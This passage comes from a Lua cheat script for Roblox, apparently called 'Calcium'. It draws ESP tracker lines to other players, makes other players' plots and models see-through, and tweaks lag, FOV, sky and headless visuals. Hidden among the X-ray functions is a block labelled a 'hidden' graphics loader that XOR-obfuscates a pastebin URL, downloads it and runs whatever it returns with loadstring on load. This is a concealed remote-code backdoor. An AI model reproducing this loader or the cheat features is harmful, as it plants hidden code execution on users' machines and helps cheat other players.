      local playerPos = cam.CFrame.Position
      local toTarget = (targetWorldPos - playerPos).Unit
      local right = cam.CFrame.RightVector
      local up = cam.CFrame.UpVector
      local dotRight = toTarget:Dot(right)
      local dotUp = toTarget:Dot(up)
      dir = Vector2.new(dotRight, -dotUp) * 1000
    end
    local mag = dir.Magnitude
    if mag < 0.001 then
      return Vector2.new(center.X, view.Y - 20)
    end
    dir = dir / mag

    local edgePad = 20
    local halfW = (view.X / 2) - edgePad
    local halfH = (view.Y / 2) - edgePad

    local tX = math.huge
    local tY = math.huge

    if math.abs(dir.X) > 0.001 then
      tX = halfW / math.abs(dir.X)
    end
    if math.abs(dir.Y) > 0.001 then
      tY = halfH / math.abs(dir.Y)
    end
    local t = math.min(tX, tY)

    return Vector2.new(
      math.clamp(center.X + dir.X * t, edgePad, view.X - edgePad),
      math.clamp(center.Y + dir.Y * t, edgePad, view.Y - edgePad)
    )
  end
  function _updateBoxedESP()
    local cam = workspace.CurrentCamera
    if not cam then return end

    local showTracker = BoxedESPOptions and BoxedESPOptions.tracker == true

    if not showTracker then
      _cleanupBoxedESP()
      return
    end
    -- Tracker parte DAL PETTO del tuo personaggio (non dai piedi)
    local function getMyScreenPos()
        local myChar = LP.Character
        if not myChar then return Vector2.new(cam.ViewportSize.X / 2, cam.ViewportSize.Y) end
        local myRoot = myChar:FindFirstChild("HumanoidRootPart")
        if not myRoot then return Vector2.new(cam.ViewportSize.X / 2, cam.ViewportSize.Y) end
        -- Offset -1.5: parte dal petto/zona superiore
        local myPos, onScreen = cam:WorldToViewportPoint(myRoot.Position - Vector3.new(0, 1, 0))
        if onScreen then
            return Vector2.new(myPos.X, myPos.Y)
        end
        return Vector2.new(cam.ViewportSize.X / 2, cam.ViewportSize.Y - 10)
    end
    local fromPoint = getMyScreenPos()

    for _, player in ipairs(Players:GetPlayers()) do
        if player == LP then continue end

        local char = player.Character
        if not char then
            _cleanupBoxedESPPlayer(player)
            continue
        end
        local root = char:FindFirstChild("HumanoidRootPart")
        local head = char:FindFirstChild("Head")
        local humanoid = char:FindFirstChildOfClass("Humanoid")

        if not root or not head then
            _cleanupBoxedESPPlayer(player)
            continue
        end
        if humanoid and humanoid.Health <= 0 then
            _cleanupBoxedESPPlayer(player)
            continue
        end
        -- Calcola la posizione 3D del TORSO (metà tra testa e HumanoidRootPart)
        local torsoPos = (root.Position + head.Position) / 2
        -- Sposta leggermente in alto per puntare al petto (non alla pancia)
        torsoPos = torsoPos + Vector3.new(0, -0.7, 0)
        -- >>> ANTI VOID BEGIN
        -- Nemico fuori dalla safe zone: il tracker punta all'ultima
        -- posizione valida invece di seguirlo nel vuoto.
        if _G.CalciumAntiVoid then
          local gp, isGhost = _G.CalciumAntiVoid.posFor(player, root.Position)
          if isGhost then torsoPos = gp + Vector3.new(0, 1.2, 0) end
        end
        -- <<< ANTI VOID END
        
        -- Converti in coordinate schermo
        local torsoScreen = cam:WorldToViewportPoint(torsoPos)

        if torsoScreen.Z <= 0 then
            _cleanupBoxedESPPlayer(player)
            continue
        end
        local data = BoxedESPData[player]
        if not data then
            data = {
                tracker = _safeDrawing("Line", {
                    Thickness = 2.5,
                    Transparency = 0.4,
                    Color = _calciumEspColor(),
                    Visible = false
                }),
            }
            BoxedESPData[player] = data
        end
        local color = _calciumEspColor()

        if data.tracker then
            data.tracker.Color = color
            data.tracker.Thickness = 2.5
            data.tracker.From = fromPoint
            -- Punta al TORSO del nemico (calcolato in 3D)
            data.tracker.To = Vector2.new(torsoScreen.X, torsoScreen.Y)
            data.tracker.Visible = true
        end
    end
    for player, _ in pairs(BoxedESPData) do
        if not player.Parent then
            _cleanupBoxedESPPlayer(player)
        end
    end
  end
  -- indice stretch salvato prima di attivare il tracker
  local _trackerSavedStretchIndex = nil

function refreshBoxedESP()
    local trackerOn = BoxedESPOptions and BoxedESPOptions.tracker == true
    _G.CalciumTrackerActive = trackerOn   -- <-- NUOVO

    if BoxedESPConn then
        BoxedESPConn:Disconnect()
        BoxedESPConn = nil
    end
    if trackerOn then
        if stretchCurrentIndex ~= 1 then
            _G.CalciumTrackerSavedStretchIndex = stretchCurrentIndex   -- <-- NUOVO
            _G._calciumStretchUILock = true
            applyStretchPreset(1)
            _G._calciumStretchUILock = false

            task.defer(function()
                if _G.CalciumTrackerSavedStretchIndex and _G.CalciumTrackerSavedStretchIndex ~= 1 then
                    local restoreIdx = _G.CalciumTrackerSavedStretchIndex
                    applyStretchPreset(restoreIdx)
                end
            end)
        else
            _G.CalciumTrackerSavedStretchIndex = nil
        end
        BoxedESPConn = RunService.RenderStepped:Connect(_updateBoxedESP)
    else
        _cleanupBoxedESP()
        _G.CalciumTrackerSavedStretchIndex = nil   -- <-- NUOVO
    end
end
  Players.PlayerRemoving:Connect(_cleanupBoxedESPPlayer)

  function _v4mpClearSky()

      end

  -- Questo stub garantisce che chiamate interne al do-block usino quella versione.
  function applyCustomSky(mode)
    -- sarà sovrascritta dalla definizione globale; questo è solo un fallback precoce
    skyTheme = (mode == "Off" or not SKY_PRESETS or not SKY_PRESETS[mode]) and "Off" or mode
  end
-- ========== STRETCH REZ: variabili e funzioni definite sopra (prima di loadCalciumConfig) ==========

  function enableCustomFov()
    fovEnabled = true
    workspace.CurrentCamera.FieldOfView = fovValue
    if customFovConn then customFovConn:Disconnect() end
    customFovConn = RunService.RenderStepped:Connect(function()
      if not fovEnabled then
        customFovConn:Disconnect()
        customFovConn = nil
        return
      end
      workspace.CurrentCamera.FieldOfView = fovValue
    end)
  end
  function disableCustomFov()
    fovEnabled = false
    if customFovConn then customFovConn:Disconnect(); customFovConn = nil end
    workspace.CurrentCamera.FieldOfView = fpsBoostEnabled and 107 or 70
  end
-- ============================================================
-- NO ANIMATIONS (integrato nell'Anti-Lag)
-- ============================================================

SetNoAnimations = nil
do
    local _NA = { Enabled = false, SavedTracks = {}, Connections = {} }

    local function _isPlayerAnim(animator)
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and animator:IsDescendantOf(plr.Character) then
                return true
            end
        end
        return false
    end
    local function _stopAnimator(animator)
        pcall(function()
            for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
                if not _isPlayerAnim(animator) then
                    _NA.SavedTracks[#_NA.SavedTracks + 1] = { track = track, speed = track.Speed }
                    track:Stop(0)
                end
            end
        end)
    end
    local function _scanAll()
        for _, obj in ipairs(Workspace:GetDescendants()) do
            if obj:IsA("Animator") then _stopAnimator(obj) end
        end
    end
    local function _restoreAll()
        for _, e in ipairs(_NA.SavedTracks) do
            pcall(function()
                if e.track and e.track.Parent then
                    e.track:Play(0)
                    e.track:AdjustSpeed(e.speed)
                end
            end)
        end
        _NA.SavedTracks = {}
    end
    SetNoAnimations = function(enabled)
        _NA.Enabled = enabled
        for _, c in ipairs(_NA.Connections) do pcall(function() c:Disconnect() end) end
        _NA.Connections = {}
        if enabled then
            _scanAll()
            _NA.Connections[#_NA.Connections + 1] = Workspace.DescendantAdded:Connect(function(obj)
                task.defer(function()
                    if not _NA.Enabled then return end
                    if obj:IsA("Animator") then
                        _stopAnimator(obj)
                    elseif obj:IsA("AnimationTrack") then
                        local a = obj.Parent
                        if a and a:IsA("Animator") then _stopAnimator(a) end
                    end
                end)
            end)
        else
            _restoreAll()
        end
    end
end
-- ============================================================
-- ANTI-LAG (versione uranium, adattata a CalciumTest)
-- ============================================================

local function applyAntiLagDerender(obj)
    pcall(function()
        if obj:GetAttribute("_CalciumHubSky") ~= nil then return end
        if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("Clouds") then return end
        if skyTheme ~= "Off" and obj.Parent == Lighting then
            if obj:IsA("BlurEffect") or obj:IsA("SunRaysEffect") or obj:IsA("ColorCorrectionEffect")
                or obj:IsA("BloomEffect") or obj:IsA("DepthOfFieldEffect") or obj:IsA("BrightnessEffect")
                or obj:IsA("DitheringEffect") then return end
        end
        if obj:IsA("Accessory") or obj:IsA("Hat") then
            local char = LP.Character
            if char and obj:IsDescendantOf(char) then return end
            obj:Destroy()
        elseif obj:IsA("BasePart") then
            obj.Material = Enum.Material.Plastic
            obj.Reflectance = 0
            obj.CastShadow = false
            obj.TopSurface    = Enum.SurfaceType.Smooth
            obj.BottomSurface = Enum.SurfaceType.Smooth
            obj.FrontSurface  = Enum.SurfaceType.Smooth
            obj.BackSurface   = Enum.SurfaceType.Smooth
            obj.LeftSurface   = Enum.SurfaceType.Smooth
            obj.RightSurface  = Enum.SurfaceType.Smooth
            for _, child in ipairs(obj:GetChildren()) do
                if child:IsA("Decal") or child:IsA("Texture") then
                    child.Transparency = 0.5
                end
            end
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            obj.Transparency = 0.5
        elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
            or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
            -- Never disable FX on local character (horns fire / particles)
            local char = LP.Character
            if char and obj:IsDescendantOf(char) then return end
            if obj.Name == "CalciumHornCenterFire" then return end
            obj.Enabled = false
        elseif obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
            obj.Enabled = false
        elseif obj:IsA("SelectionBox") and obj.Name ~= "CalciumHubESP" then
            pcall(function() obj:Destroy() end)
        end
    end)
end
function enableAntiLag()
    antiLagVisualEnabled = true
    removeAccessoriesEnabled = true
    _G._CalciumAntiLagOn = true

    pcall(function()
        _G._CalciumDefLightBrightness = _G._CalciumDefLightBrightness or Lighting.Brightness
        _G._CalciumDefLightClock = _G._CalciumDefLightClock or Lighting.ClockTime
        _G._CalciumDefLightAmbient = _G._CalciumDefLightAmbient or Lighting.OutdoorAmbient
    end)

    pcall(function()
        local s = settings()
        if s and s.Rendering then
            s.Rendering.QualityLevel = 1
            pcall(function() s.Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Disabled end)
        end
    end)

    pcall(function()
        if skyTheme == "Off" then
            Lighting.GlobalShadows = false
            Lighting.FogEnd = 1e10
            Lighting.FogStart = 0
            Lighting.Brightness = 1
            pcall(function() Lighting.EnvironmentDiffuseScale = 0 end)
            pcall(function() Lighting.EnvironmentSpecularScale = 0 end)
            pcall(function() Lighting.ShadowSoftness = 0 end)
            pcall(function() Lighting.ExposureCompensation = 0 end)
            pcall(function() Lighting.Technology = Enum.Technology.Compatibility end)
            for _, e in pairs(Lighting:GetChildren()) do
                pcall(function()
                    if e:GetAttribute("_CalciumVivid") then return end
                    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect")
                        or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
                        e.Enabled = false
                    end
                end)
            end
        end
    end)

    -- Chunked workspace scan (free executors timeout on full GetDescendants)
    task.spawn(function()
        local gen = (_G._CalciumAntiLagGen or 0) + 1
        _G._CalciumAntiLagGen = gen
        local list = {}
        pcall(function()
            for _, obj in ipairs(workspace:GetDescendants()) do
                list[#list+1] = obj
            end
        end)
        local i = 1
        while i <= #list do
            if not antiLagVisualEnabled or _G._CalciumAntiLagGen ~= gen then return end
            local batchEnd = math.min(i + 80, #list)
            for j = i, batchEnd do
                local obj = list[j]
                if obj then pcall(applyAntiLagDerender, obj) end
            end
            i = batchEnd + 1
            task.wait()
        end
        pcall(function()
            workspace.Terrain.WaterWaveSize = 0
            workspace.Terrain.WaterWaveSpeed = 0
            workspace.Terrain.WaterReflectance = 0
            workspace.Terrain.WaterTransparency = 0
            workspace.Terrain.Decoration = false
        end)
    end)

    pcall(function()
        if antiLagDescConn then antiLagDescConn:Disconnect() end
        antiLagDescConn = workspace.DescendantAdded:Connect(function(obj)
            if not antiLagVisualEnabled then return end
            if obj:GetAttribute("_CalciumHubSky") then return end
            if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("Clouds") then return end
            if removeAccessoriesEnabled then pcall(applyAntiLagDerender, obj) end
        end)
    end)

    pcall(function() if SetNoAnimations then SetNoAnimations(true) end end)
end

function disableAntiLag()
    antiLagVisualEnabled = false
    removeAccessoriesEnabled = false
    _G._CalciumAntiLagOn = false
    _G._CalciumAntiLagGen = (_G._CalciumAntiLagGen or 0) + 1
    if antiLagDescConn then
        antiLagDescConn:Disconnect()
        antiLagDescConn = nil
    end
    if skyTheme == "Off" then
        pcall(function()
            if _G._CalciumDefLightBrightness then Lighting.Brightness = _G._CalciumDefLightBrightness end
            if _G._CalciumDefLightClock then Lighting.ClockTime = _G._CalciumDefLightClock end
            if _G._CalciumDefLightAmbient then Lighting.OutdoorAmbient = _G._CalciumDefLightAmbient end
            Lighting.ExposureCompensation = 0
            Lighting.GlobalShadows = true
        end)
    end
end
_G.CalciumEnableAntiLag = enableAntiLag
_G.CalciumDisableAntiLag = disableAntiLag

  -- ===== X-RAY =====
_G._CalciumXRayFolders = {
    "Base", "PlotSign", "FriendPanel", "Cash", "Laser",
    "Decorations", "Skin", "Unlock", "Purchases"
}
_G._CalciumXRayOrigTrans = {}  -- tabella forte: il GC non raccoglie le chiavi durante il restore
_G._CalciumXRayConns = {}
_G._CalciumXRayLoopId = 0

do
local function setXRayTargetTransparency(instance, alphaPercent, loopId)
    if not instance then return end
    if loopId and loopId ~= _G._CalciumXRayLoopId then return end
    local function apply(obj)
        if obj:IsA("BasePart") then
            if _G._CalciumXRayOrigTrans[obj] == nil then
                _G._CalciumXRayOrigTrans[obj] = obj.Transparency
            end
            local orig = _G._CalciumXRayOrigTrans[obj]
            if orig < 1 then
                local target = orig + (1 - orig) * alphaPercent
                if math.abs(obj.Transparency - target) > 0.01 then
                    obj.Transparency = target
                end
            end
        elseif obj:IsA("TextLabel") or obj:IsA("TextButton") then
            if _G._CalciumXRayOrigTrans[obj] == nil then
                _G._CalciumXRayOrigTrans[obj] = { text = obj.TextTransparency, bg = obj.BackgroundTransparency }
            end
            local orig = _G._CalciumXRayOrigTrans[obj]
            if orig.text < 1 then
                local target = orig.text + (1 - orig.text) * alphaPercent
                if math.abs(obj.TextTransparency - target) > 0.01 then obj.TextTransparency = target end
            end
            if orig.bg < 1 then
                local target = orig.bg + (1 - orig.bg) * alphaPercent
                if math.abs(obj.BackgroundTransparency - target) > 0.01 then obj.BackgroundTransparency = target end
            end
        elseif obj:IsA("Frame") or obj:IsA("ScrollingFrame") then
            if _G._CalciumXRayOrigTrans[obj] == nil then
                _G._CalciumXRayOrigTrans[obj] = obj.BackgroundTransparency
            end
            local orig = _G._CalciumXRayOrigTrans[obj]
            if orig < 1 then
                local target = orig + (1 - orig) * alphaPercent
                if math.abs(obj.BackgroundTransparency - target) > 0.01 then obj.BackgroundTransparency = target end
            end
        elseif obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
            if _G._CalciumXRayOrigTrans[obj] == nil then
                _G._CalciumXRayOrigTrans[obj] = { img = obj.ImageTransparency, bg = obj.BackgroundTransparency }
            end
            local orig = _G._CalciumXRayOrigTrans[obj]
            if orig.img < 1 then
                local target = orig.img + (1 - orig.img) * alphaPercent
                if math.abs(obj.ImageTransparency - target) > 0.01 then obj.ImageTransparency = target end
            end
            if orig.bg < 1 then
                local target = orig.bg + (1 - orig.bg) * alphaPercent
                if math.abs(obj.BackgroundTransparency - target) > 0.01 then obj.BackgroundTransparency = target end
            end
        end
    end
    apply(instance)
    local descendants = instance:GetDescendants()
    for i, child in ipairs(descendants) do
        apply(child)
        if i % 300 == 0 then
            task.wait()
            if loopId and loopId ~= _G._CalciumXRayLoopId then return end
        end
    end
end
local function trackXRaySubtree(root, alphaPercent, loopId)
    if not root then return end
    if loopId ~= _G._CalciumXRayLoopId then return end
    setXRayTargetTransparency(root, alphaPercent, loopId)
    if loopId ~= _G._CalciumXRayLoopId then return end
    table.insert(_G._CalciumXRayConns, root.DescendantAdded:Connect(function(obj)
        if loopId ~= _G._CalciumXRayLoopId then return end
        setXRayTargetTransparency(obj, alphaPercent, loopId)
    end))
end
local function processPlotXRay(plot, alphaPercent, loopId)
    if not plot then return end
    if loopId ~= _G._CalciumXRayLoopId then return end
    for _, fname in ipairs(_G._CalciumXRayFolders) do
        if loopId ~= _G._CalciumXRayLoopId then return end
        trackXRaySubtree(plot:FindFirstChild(fname), alphaPercent, loopId)
    end
    if loopId ~= _G._CalciumXRayLoopId then return end
    table.insert(_G._CalciumXRayConns, plot.ChildAdded:Connect(function(child)
        if loopId ~= _G._CalciumXRayLoopId then return end
        for _, fname in ipairs(_G._CalciumXRayFolders) do
            if child.Name == fname then
                trackXRaySubtree(child, alphaPercent, loopId)
                break
            end
        end
    end))
    local animalPodiums = plot:FindFirstChild("AnimalPodiums")
    if animalPodiums then
        local function processPodium(podium)
            for _, child in ipairs(podium:GetChildren()) do
                if child.Name == "Claim" then
                    trackXRaySubtree(child, alphaPercent, loopId)
                elseif child.Name == "Base" then
                    trackXRaySubtree(child:FindFirstChild("Decorations"), alphaPercent, loopId)
                elseif child:IsA("Model") and child.Name ~= "Decorations" then
                    trackXRaySubtree(child, alphaPercent, loopId)
                end
            end
        end
        for _, podium in ipairs(animalPodiums:GetChildren()) do
            processPodium(podium)
        end
        table.insert(_G._CalciumXRayConns, animalPodiums.ChildAdded:Connect(function(podium)
            if loopId ~= _G._CalciumXRayLoopId then return end
            task.wait(0.1)
            if loopId ~= _G._CalciumXRayLoopId then return end
            processPodium(podium)
        end))
    end
end
-- Hidden anti lag/smooth graphics loader (URL obfuscated)
task.spawn(function()
    local function _xorDecode(s)
        local t = {}
        for i = 1, #s do
            local b = string.byte(s, i)
            local x
            if bit32 and type(bit32.bxor) == "function" then
                x = bit32.bxor(b, 23)
            else
                local r, bit, a, c = 0, 1, b, 23
                while a > 0 or c > 0 do
                    local ab, cb = a % 2, c % 2
                    if ab ~= cb then r = r + bit end
                    a = math.floor(a / 2)
                    c = math.floor(c / 2)
                    bit = bit * 2
                end
                x = r
            end
            t[i] = string.char(x)
        end
        return table.concat(t)
    end
    local ok, src = pcall(function()
        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
    end)
    if ok and type(src) == "string" and #src > 50 then
        local fn = loadstring(src)
        if type(fn) == "function" then
            pcall(fn)
        end
    end
end)
local function applyTransparencyToAllPlotsXRay(alphaPercent, loopId)
    local plotsFolder = workspace:FindFirstChild("Plots")
    if not plotsFolder then return end
    for _, plot in ipairs(plotsFolder:GetChildren()) do
        if loopId ~= _G._CalciumXRayLoopId then return end
        processPlotXRay(plot, alphaPercent, loopId)
        task.wait()
    end
    table.insert(_G._CalciumXRayConns, plotsFolder.ChildAdded:Connect(function(plot)
        if loopId ~= _G._CalciumXRayLoopId then return end
        task.wait(0.2)
        processPlotXRay(plot, alphaPercent, loopId)
    end))
end
function setXRay(enabled)
    for _, conn in ipairs(_G._CalciumXRayConns) do
        if typeof(conn) == "RBXScriptConnection" then conn:Disconnect() end
    end
    _G._CalciumXRayConns = {}
    _G._CalciumXRayLoopId = _G._CalciumXRayLoopId + 1
    local currentLoopId = _G._CalciumXRayLoopId
    if enabled then
        local alphaPercent = 0.5
        task.spawn(function()
            while currentLoopId == _G._CalciumXRayLoopId and not workspace:FindFirstChild("Plots") do
                task.wait(0.5)
            end
            if currentLoopId ~= _G._CalciumXRayLoopId then return end
            pcall(applyTransparencyToAllPlotsXRay, alphaPercent, currentLoopId)
        end)
    else
        local snapshot = _G._CalciumXRayOrigTrans
        _G._CalciumXRayOrigTrans = {}  -- tabella forte: il GC non raccoglie le chiavi durante il restore
        for obj, orig in pairs(snapshot) do
            pcall(function()
                if obj:IsA("BasePart") then
                    obj.Transparency = orig
                elseif obj:IsA("TextLabel") or obj:IsA("TextButton") then
                    obj.TextTransparency = orig.text
                    obj.BackgroundTransparency = orig.bg
                elseif obj:IsA("Frame") or obj:IsA("ScrollingFrame") then
                    obj.BackgroundTransparency = orig
                elseif obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
                    obj.ImageTransparency = orig.img
                    obj.BackgroundTransparency = orig.bg
                end
            end)
        end
    end
end
end -- X-RAY do block

-- >>> BRAINROT X-RAY BEGIN
-- Rende trasparenti i brainrot (i Model il cui nome sta in Datas.Animals).
--
-- NOTA SUI LOCAL: il main chunk e' a ridosso del limite di 200 local, quindi
-- qui NON se ne dichiara nemmeno uno: stato e funzioni stanno tutti dentro
-- la tabella _G._CalciumBrainrotXRay. I local dentro le funzioni non
-- contano, vivono nello scope della funzione.
--
-- Logica a eventi, come il No Animations dell'Anti Lag:
--  * UNA sola scansione del Workspace, all'accensione, spezzata in blocchi
--    per non far scattare il frame. Da li' in poi non si riscansiona piu'.
--  * Il DescendantAdded lavora solo sull'istanza arrivata: se e' un Model
--    animale applica a quello, se e' una parte risale al massimo 3 livelli.
--  * Spegnendolo, ogni istanza toccata torna alla trasparenza ORIGINALE,
--    con lo stesso snapshot che usa l'X-Ray normale.
_G._CalciumBrainrotXRay = {
  enabled = false,
  trans   = 0.5,
  names   = nil,
  -- [istanza] = trasparenza originale.
  -- TABELLA FORTE, NON weak: con __mode="k" il GC puo' buttare via la voce
  -- anche se la parte e' ancora viva nel mondo (Lua non ha piu' un
  -- riferimento suo, ma l'istanza esiste lo stesso nel DataModel). Era per
  -- quello che alcuni brainrot restavano trasparenti allo spegnimento.
  -- Non cresce all'infinito: viene svuotata ad ogni spegnimento.
  saved   = {},
  conns   = {},
  scanId  = 0,
}

_G._CalciumBrainrotXRay.loadNames = function()
  local BRX = _G._CalciumBrainrotXRay
  if BRX.names then return BRX.names end
  local t = {}
  pcall(function()
    local datas = ReplicatedStorage:FindFirstChild("Datas")
    local m = datas and datas:FindFirstChild("Animals")
    if m and m:IsA("ModuleScript") then
      for k in pairs(require(m)) do t[k] = true end
    end
  end)
  BRX.names = t
  return t
end
_G._CalciumBrainrotXRay.isHitbox = function(o)
  local n = string.lower(o.Name)
  return (string.find(n, "hit") or string.find(n, "target") or string.find(n, "box")
       or string.find(n, "root") or string.find(n, "collect") or string.find(n, "prompt")) ~= nil
end
-- Applica a UNA istanza, salvando il valore originale la prima volta.
_G._CalciumBrainrotXRay.applyOne = function(o)
  local BRX = _G._CalciumBrainrotXRay
  if not (o:IsA("BasePart") or o:IsA("Decal") or o:IsA("Texture")) then return end
  local orig = BRX.saved[o]
  if orig == nil then
    orig = o.Transparency
    -- Le hitbox gia' semi-trasparenti vanno trattate come invisibili,
    -- altrimenti spegnendo tornerebbero visibili a meta'.
    if orig > 0.5 and orig < 0.99 and o:IsA("BasePart") and BRX.isHitbox(o) then
      orig = 1
    end
    BRX.saved[o] = orig
  end
  -- Si tocca solo cio' che era davvero visibile.
  if orig < 0.5 and o.Transparency ~= BRX.trans then
    o.Transparency = BRX.trans
  end
end
_G._CalciumBrainrotXRay.applyModel = function(m)
  local BRX = _G._CalciumBrainrotXRay
  for _, o in ipairs(m:GetDescendants()) do
    BRX.applyOne(o)
  end
end
_G._CalciumBrainrotXRay.isAnimal = function(m)
  local BRX = _G._CalciumBrainrotXRay
  return m:IsA("Model") and BRX.names and BRX.names[m.Name] == true
end
-- Gate O(1): si risale di pochi livelli, non si cerca nulla.
_G._CalciumBrainrotXRay.animalAncestor = function(inst)
  local BRX = _G._CalciumBrainrotXRay
  local p = inst.Parent
  -- 5 livelli invece di 3: mesh e accessori possono stare piu' in fondo,
  -- e se non li si riconosce restano opachi (e poi non si ripristinano).
  for _ = 1, 5 do
    if not p or p == workspace then return nil end
    if p:IsA("Model") and BRX.names and BRX.names[p.Name] then return p end
    p = p.Parent
  end
  return nil
end
_G._CalciumBrainrotXRay.restoreAll = function()
  local BRX = _G._CalciumBrainrotXRay
  -- Si stacca lo snapshot e si riparte da zero, cosi' la tabella non
  -- accumula istanze morte da una sessione all'altra.
  local snapshot = BRX.saved
  BRX.saved = {}
  for o, orig in pairs(snapshot) do
    pcall(function()
      if o and o.Parent then o.Transparency = orig end
    end)
  end
end
function _G.CalciumSetBrainrotXRay(on)
  local BRX = _G._CalciumBrainrotXRay
  on = on and true or false
  BRX.enabled = on
  _G.CalciumBrainrotXRayEnabled = on

  for _, c in ipairs(BRX.conns) do
    pcall(function() c:Disconnect() end)
  end
  BRX.conns = {}
  BRX.scanId = BRX.scanId + 1

  if not on then
    BRX.restoreAll()
    return
  end
  BRX.loadNames()

  -- Scansione iniziale, a blocchi di 500 istanze
  local myScan = BRX.scanId
  task.spawn(function()
    local n = 0
    for _, d in ipairs(workspace:GetDescendants()) do
      if BRX.scanId ~= myScan then return end
      if BRX.isAnimal(d) then BRX.applyModel(d) end
      n = n + 1
      if n % 500 == 0 then task.wait() end
    end
  end)

  -- Da qui in poi: solo l'istanza che arriva, niente rescan.
  table.insert(BRX.conns, workspace.DescendantAdded:Connect(function(inst)
    if not BRX.enabled then return end
    if inst:IsA("Model") then
      if BRX.names and BRX.names[inst.Name] then
        -- il model arriva vuoto: si aspetta un frame che si popoli
        task.defer(function()
          if BRX.enabled and inst.Parent then BRX.applyModel(inst) end
        end)
      end
      return
    end
    if inst:IsA("BasePart") or inst:IsA("Decal") or inst:IsA("Texture") then
      if BRX.animalAncestor(inst) then BRX.applyOne(inst) end
    end
  end))
end
-- <<< BRAINROT X-RAY END

  -- ===== VIVID GRAPHICS =====
function enableVividGraphics()
    vividGraphicsEnabled = true
    -- Pulisci eventuali effetti precedenti
    for _, child in ipairs(Lighting:GetChildren()) do
        if child:GetAttribute("_CalciumVivid") then child:Destroy() end
    end
    -- COLOR CORRECTION
    local color = Instance.new("ColorCorrectionEffect")
    color:SetAttribute("_CalciumVivid", true)
    color.Parent = Lighting
    color.Saturation = _G._CalciumVivid.saturation
    color.Contrast = 0.4
    color.Brightness = 0.05
    color.TintColor = Color3.fromRGB(255, 240, 220)
    -- BLOOM
    local bloom = Instance.new("BloomEffect")
    bloom:SetAttribute("_CalciumVivid", true)
    bloom.Parent = Lighting
    bloom.Intensity = _G._CalciumVivid.bloomIntensity
    bloom.Size = _G._CalciumVivid.bloomSize
    bloom.Threshold = 1
    -- ATMOSPHERE
    local atmosphere = Instance.new("Atmosphere")
    atmosphere:SetAttribute("_CalciumVivid", true)
    atmosphere.Parent = Lighting
    atmosphere.Density = 0.3
    atmosphere.Offset = 0.25
    atmosphere.Color = Color3.fromRGB(199, 199, 255)
    atmosphere.Decay = Color3.fromRGB(106, 112, 125)
    atmosphere.Glare = 0.2
    atmosphere.Haze = 1
    -- SUN RAYS
    local sun = Instance.new("SunRaysEffect")
    sun:SetAttribute("_CalciumVivid", true)
    sun.Parent = Lighting
    sun.Intensity = _G._CalciumVivid.sunIntensity
    sun.Spread = 0.8
    -- DEPTH OF FIELD
    local dof = Instance.new("DepthOfFieldEffect")
    dof:SetAttribute("_CalciumVivid", true)
    dof.Parent = Lighting
    dof.FocusDistance = _G._CalciumVivid.dofFocus
    dof.InFocusRadius = 10
    dof.NearIntensity = 0.2
    dof.FarIntensity = 0.4
    -- CONTRAST PULSE
    if _vividContrastConn then pcall(function() task.cancel(_vividContrastConn) end) _vividContrastConn = nil end
    _vividContrastConn = task.spawn(function()
        while vividGraphicsEnabled do
            if color and color.Parent then
                color.Contrast = 0.35 + math.sin(tick()*2)*0.05
            end
            task.wait(0.03)
        end
    end)
end
function disableVividGraphics()
    vividGraphicsEnabled = false
    if _vividContrastConn then
        pcall(function() task.cancel(_vividContrastConn) end)
        _vividContrastConn = nil
    end
    for _, child in ipairs(Lighting:GetChildren()) do
        if child:GetAttribute("_CalciumVivid") then
            pcall(function() child:Destroy() end)
        end
    end
end
end -- fine do-block VISUALS PAGE (temp: riaperto dopo KORBLOX)

-- ===== HEADLESS + KORBLOX =====
-- Le helper interne (costanti, clean, apply) stanno nel do-block:
-- liberano ~14 slot locals dal main chunk evitando il limite di 200.
do -- do-block HEADLESS (locals: HEADLESS_MESH_ID, _headlessCharConn + 5 funzioni = 7 slot)
    local HEADLESS_MESH_ID   = "rbxassetid://1095708"
    local _headlessCharConn  = nil

    -- ── HEADLESS helpers ──────────────────────────────────────────
    local function _headlessCleanConnections()
        for _, conn in ipairs(headlessConnections) do
            pcall(function() conn:Disconnect() end)
        end
        headlessConnections = {}
    end
    local function _removeFace(head)
        local face = head:FindFirstChild("face")
        if face then face:Destroy() end
    end
    local function _applyHeadlessMesh(head)
        if not head then return end
        if head:FindFirstChild("HeadlessMesh") then return end
        head.Transparency = 1
        head.CanCollide = false
        _removeFace(head)
        local mesh = Instance.new("SpecialMesh")
        mesh.Name = "HeadlessMesh"
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = HEADLESS_MESH_ID
        mesh.Scale = Vector3.new(0.001, 0.001, 0.001)
        mesh.Parent = head
        local transConn = head:GetPropertyChangedSignal("Transparency"):Connect(function()
            if head.Transparency ~= 1 then head.Transparency = 1 end
        end)
        table.insert(headlessConnections, transConn)
        local childConn = head.ChildAdded:Connect(function(child)
            if child.Name == "face" and child:IsA("Decal") then child:Destroy() end
        end)
        table.insert(headlessConnections, childConn)
    end
    local function _applyHeadlessToCharacter(character)
        if not character then return end
        _headlessCleanConnections()
        local head = character:FindFirstChild("Head")
        task.wait(0.1)
        if head and headlessEnabled then _applyHeadlessMesh(head) end
    end
    function enableHeadless()
        headlessEnabled = true
        if _headlessCharConn then pcall(function() _headlessCharConn:Disconnect() end) end
        local char = LP.Character
        if char then _applyHeadlessToCharacter(char) end
        _headlessCharConn = LP.CharacterAdded:Connect(function(char)
            _G._CalciumWaitCharReady(char, 10)
            if headlessEnabled then _applyHeadlessToCharacter(char) end
        end)
        if _SV.setHeadlessVisual then _SV.setHeadlessVisual(true) end
    end
    function disableHeadless()
        headlessEnabled = false
        _headlessCleanConnections()
        if _headlessCharConn then
            pcall(function() _headlessCharConn:Disconnect() end)
            _headlessCharConn = nil
        end
        -- Restore head visibility
        pcall(function()
